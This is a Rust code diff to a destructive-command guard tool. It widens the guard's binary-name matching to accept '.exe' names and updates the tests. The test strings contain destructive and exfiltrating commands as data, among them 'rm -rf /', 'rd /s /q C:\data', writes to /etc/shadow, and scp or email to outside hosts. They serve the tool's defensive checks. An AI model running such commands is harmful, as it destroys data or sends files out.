@@ -719,7 +719,14 @@ fn segment_is_dcg_inspection_call(segment: &str) -> bool {
 /// binary name.
 fn is_dcg_binary_name(arg0: &str) -> bool {
     let base = arg0.rsplit(['/', '\\']).next().unwrap_or(arg0);
-    base == "dcg" || base == "destructive_command_guard"
+    let stem = base
+        .get(..base.len().saturating_sub(4))
+        .filter(|_| {
+            base.get(base.len().saturating_sub(4)..)
+                .is_some_and(|suffix| suffix.eq_ignore_ascii_case(".exe"))
+        })
+        .unwrap_or(base);
+    stem.eq_ignore_ascii_case("dcg") || stem.eq_ignore_ascii_case("destructive_command_guard")
 }
 
 /// Tokenize a single shell command segment into its argv words, honoring shell
@@ -1444,6 +1451,9 @@ pub fn entry_path_matches(entry: &AllowEntry, path: &str) -> bool {
 ///
 /// Handles symlink resolution (optional), relative-to-absolute conversion,
 /// and path separator normalization.
+///
+/// # Errors
+/// Returns the error message as a `String` if the path cannot be resolved.
 pub fn resolve_path_for_matching(
     path: &str,
     base_dir: Option<&Path>,
@@ -3220,12 +3230,6 @@ mod tests {
         assert!(is_builtin_inspection_wrapper_call(
             "ee preflight check --cmd-base64 cm0gLXJmIC8="
         ));
-        assert!(is_builtin_inspection_wrapper_call(
-            "ee preflight verify --cmd \"git reset --hard\""
-        ));
-        assert!(is_builtin_inspection_wrapper_call(
-            "ee preflight check --stdin --json"
-        ));
         // --stdin with plain flags (no redirect) still allowed
         assert!(is_builtin_inspection_wrapper_call(
             "ee preflight check --stdin --json"
@@ -3266,6 +3270,15 @@ mod tests {
         ));
         assert!(is_dcg_self_inspection_call(
             "~/.local/bin/dcg test \"git reset --hard\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"dcg.exe test "Send-MailMessage -To outside@example.test""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#""C:\Program Files\dcg\DCG.EXE" explain "scp report.csv user@outside.example:/drop/""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"destructive_command_guard.exe classify "rd /s /q C:\data""#
         ));
     }
 
@@ -3335,7 +3348,6 @@ mod tests {
         assert!(!is_dcg_self_inspection_call(
             "dcg explain \"x\" >> /etc/passwd"
         ));
-        assert!(!is_dcg_self_inspection_call("dcg test \"x\" 2> /tmp/err"));
         assert!(!is_dcg_self_inspection_call(
             "dcg test \"x\" 2> /etc/shadow"
         ));
@@ -3343,28 +3355,20 @@ mod tests {
     }
 
     #[test]
-    fn dcg_self_inspection_rejects_not_a_dcg_binary_lookalikes() {
-        // Not a real dcg binary.
-        assert!(!is_dcg_self_inspection_call("not-dcg test \"rm -rf /\""));
-        assert!(!is_dcg_self_inspection_call("dcg_something test \"x\""));
-        assert!(!is_dcg_self_inspection_call("mydcg test \"rm -rf /\""));
-        assert!(!is_dcg_self_inspection_call("dcgwrapper test \"rm -rf /\""));
-        // Unknown subcommand is not a diagnostic.
-        assert!(!is_dcg_self_inspection_call("dcg run \"rm -rf /\""));
-        assert!(!is_dcg_self_inspection_call("dcg scan ."));
+    fn dcg_self_inspection_rejects_non_diagnostic_and_lookalikes() {
+        // Not a dcg diagnostic subcommand.
         assert!(!is_dcg_self_inspection_call("dcg install --hook"));
         assert!(!is_dcg_self_inspection_call("dcg hook"));
-        // Only flags, no subcommand.
-        assert!(!is_dcg_self_inspection_call("dcg --robot --version"));
+        assert!(!is_dcg_self_inspection_call("dcg"));
         // Token-boundary: `testfoo` is not `test`.
         assert!(!is_dcg_self_inspection_call("dcg testfoo rm -rf /"));
+        // A different binary that merely starts with `dcg`-ish text.
+        assert!(!is_dcg_self_inspection_call("mydcg test \"rm -rf /\""));
+        assert!(!is_dcg_self_inspection_call("dcgwrapper test \"rm -rf /\""));
         // Plain destructive commands are unaffected.
         assert!(!is_dcg_self_inspection_call("rm -rf /"));
         assert!(!is_dcg_self_inspection_call("git reset --hard"));
-        // Bare `dcg` or empty input.
-        assert!(!is_dcg_self_inspection_call("dcg"));
         assert!(!is_dcg_self_inspection_call(""));
-        assert!(!is_dcg_self_inspection_call("   "));
     }
 
     #[test]
